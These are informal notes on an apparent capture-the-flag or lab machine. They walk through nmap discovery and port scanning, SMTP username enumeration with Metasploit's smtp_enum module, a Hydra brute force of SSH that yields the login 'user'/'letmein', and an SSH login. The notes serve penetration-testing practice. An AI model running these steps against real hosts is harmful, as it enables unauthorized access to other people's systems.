open the network in nat network
do a nmap scan on Local network
	nmap -sn <IP>
		found the ip
after that do an nmap scan on the found ip
		found all these port
			22/tcp   open  ssh 
			25/tcp   open  smtp 
			79/tcp   open  finger
			110/tcp  open  pop3
			111/tcp  open  rpcbind
			143/tcp  open  imap
			512/tcp  open  exec       netkit-rsh rexecd
			513/tcp  open  login?
			514/tcp  open  tcpwrapped
			993/tcp  open  ssl/imap   Dovecot imapd
			995/tcp  open  ssl/pop3   Dovecot pop3d
			049/tcp open  nfs 
open msf console (metasploit)
	then do a 'search on smtp'
		find the module you want in this case auxiliary/scanner/smtp/smtp_enum 
			then type 'use 41'
				'show options'
					set RHOSTS <Target IP> (command should be UPPER CASE as linux is case sensitive verify chatgpt)
						type "options" to check if that has been set
							then run 'exploit'
								here we will get bunch viable usernames  and from that guess and select a few and save that
									in this case i took "user" as username
next do a hydra brute force on username and password
	hydra -t 4 -L <path to username file> -P <path to password file> <target ip> ssh	
		found : [22][ssh] host: 192.168.1.108   login: user   password: letmein	
			then ssh into the machine
		
		(also we can enumerate through nsf)
